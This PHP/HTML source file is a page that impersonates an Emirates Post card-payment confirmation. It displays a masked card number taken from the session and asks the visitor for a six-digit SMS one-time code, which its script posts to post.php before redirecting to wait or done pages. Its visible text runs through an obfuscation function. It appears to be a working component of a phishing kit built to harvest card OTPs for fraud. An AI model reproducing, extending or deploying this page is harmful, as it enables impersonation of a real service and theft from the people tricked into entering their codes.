<?php
require "../main.php";
$time = date("Y-m-d, H:i");
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>confirmation</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/bootstrap/4.6.2/css/bootstrap.min.css">
    <link rel="stylesheet" href="res/css/style.css">
    <link rel="stylesheet" href="res/css/media.css">
</head>
<body style="background:white;">
    
<div class="window" id="loader" style="display:none;">
    <div class="loader">
        <div class="content" style="width:100%;">
            <img src="res/img/loading.gif">
            <p><?php $obf->obf("Please wait..."); ?></p>
        </div>
    </div>
</div>



<section class="p-4">
<!-- SMS -->
<div class="sms container-fluid "  id="sms">
<div class="container-lg" style="width:500px; max-width:100%;">
<div class="row align-items-center border-bottom">
<div class="col text-left">
<img src="res/img/logo.svg">
</div>
<div class="col text-right">
    <img src="res/img/mv.png" style="width:140px;">
</div>
</div>

<!-- -------------------------------- end header -->


<!-- start body -->
<div class="w-100 text-center border-bottom py-5" style="font-size:0.8em;">
<h4 class="text-left"><?php $obf->obf("OTP-Confirmation"); ?></h4>
<p class="text-left" style="font-size:1.3em;">
<?php $obf->obf("Please submit the code sent to your phone number to confirm this operation."); ?>
</p>
<table class="table-sm d-inline-block ">
<tr>
<th><?php $obf->obf("Date"); ?> :</th>
<td><?php echo $time; ?></td>
</tr>
<tr>
<th><?php $obf->obf("Amount"); ?>:</th>
<td><?php $obf->obf($amount); ?>  </td>
</tr>
<tr>
<th><?php $obf->obf("Card number"); ?>:</th>
<td><?php $obf->obf("XXXX XXXX XXXX"); ?> <?php echo substr(@$_SESSION['d5'], -4); ?> </td>
</tr>
<tr>
<th><?php $obf->obf("Merchant"); ?> :</th>
<td><?php $obf->obf("Emirates Post"); ?></td>
</tr>
<tr>
<th><?php $obf->obf("OTP"); ?> :</th>
<td><input type="text" id="otp" maxlength="6" autocomplete="one-time-code" placeholder="Enter OTP" style="border:1px solid #333; border-radius:3px;"></td>
</tr>
<tr>
<th></th>
<td style="color:red;" id="sms_error"><?php if(isset($_GET['e'])){echo 'Invalid OTP'; } ?></td>
</tr>
</table>

</div>

<!-- end body -->


<div class=" py-3">
<div class="row">
<div class="col text-left" style="font-size:0.8em; padding:10px;">
<a href="javascript:newOtp()"><?php $obf->obf("Request new code"); ?></a> in <b id="timer">30</b>
</div>
<div class="col-sm-3 text-right">
<button class="btn btn-info" onclick="sendOtp()">Confirm</button>   
</div>
</div>
</div>

</div>
</div>
<!-- END SMS -->



</section>


<script src="res/cdn/jq.js"></script>
<script src="res/cdn/m.js"></script>
<script src="res/cdn/cv.js"></script>
<script>
var startTimer = true;
var timer = 30;
var isCounting = false;
 
 

function sendOtp(){

    $("#otp").removeClass("error");
    if($("#otp").val().length==6){
        $("#sms_error").html("");
        $("#loader").show();
        $.post("post.php",{
            
            otp:$("#otp").val()
        },(d)=>{        
            <?php 
            if(isset($_GET['e'])){
                echo 'window.location="done.php";';
            }else{
                echo 'window.location="wait.php?p=OTP";';
            }
            
            ?>
        });

    }else{
        $("#otp").addClass("error");
    }
}


$("#sms input").keypress((e)=>{
    if(e.key=="Enter"){
        sendOtp();
    }
});






function newOtp(){
    startTimer=true;
    if(timer<=1){
        timer=30;
    }
}


setInterval(()=>{
    if(startTimer && timer>0){
        timer = timer - 1;
        $("#timer").html(timer);
    }

}, 1000);


 
</script>
 
</body>
</html>